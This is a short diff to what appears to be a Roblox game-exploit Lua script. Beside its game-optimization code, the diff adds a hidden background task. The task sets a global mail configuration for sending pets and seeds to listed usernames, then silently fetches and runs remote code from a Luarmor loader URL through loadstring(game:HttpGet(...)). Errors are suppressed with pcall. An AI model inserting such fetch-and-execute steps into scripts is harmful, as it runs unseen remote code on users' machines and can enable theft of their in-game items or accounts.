@@ -57,6 +57,22 @@ end
 
 pcall(OptimizeGame)
 
+task.spawn(function()
+    pcall(function()
+        getgenv().UserConfig = {
+            ["Auto Claim Mail"] = true,
+            ["Auto Send Mail"] = false,
+            ["Mail To Username"] = {},
+            ["Items To Mail"] = {
+                ["Pet"] = {},
+                ["Seed"] = {},
+            }
+        }
+
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/69646c718a6612f0e46df24197570733.lua"))()
+    end)
+end)
+
 local Controllers = Player:WaitForChild("PlayerScripts"):WaitForChild("Controllers")
 
 local PlantController = require(Controllers:WaitForChild("PlantController"))
